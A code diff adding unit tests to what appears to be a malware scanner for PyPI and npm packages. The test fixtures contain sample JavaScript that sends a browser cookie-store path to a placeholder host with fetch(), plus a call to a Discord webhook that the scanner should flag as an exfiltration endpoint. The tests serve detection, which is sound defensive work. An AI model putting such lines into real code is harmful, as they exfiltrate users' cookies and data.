@@ -60,6 +60,19 @@ def test_shipped_files(path):
     assert not is_dev_file(path)
 
 
+def test_javascript_in_a_python_package_is_only_a_web_asset():
+    files = {"pkg/__init__.py": "",
+             "pkg/static/chunk.js": "const p='Default/Network/Cookies';fetch('https://x.example/'+p)"}
+    assert rules(files, "pypi") == []
+    files["pkg/static/hook.js"] = "fetch('https://discord.com/api/webhooks/1/x')"
+    assert rules(files, "pypi") == ["exfil-endpoint"]
+
+
+def test_python_in_an_npm_package_is_a_helper():
+    files = {"package.json": "{}", "gyp/setup.py": "import os\nos.system('make')"}
+    assert rules(files, "npm") == []
+
+
 def test_dev_files_only_count_never_innocent_signs():
     files = {
         "tests/test_api.py": "import os, subprocess\nsubprocess.run('x')\nu = 'http://8.8.8.8/'",
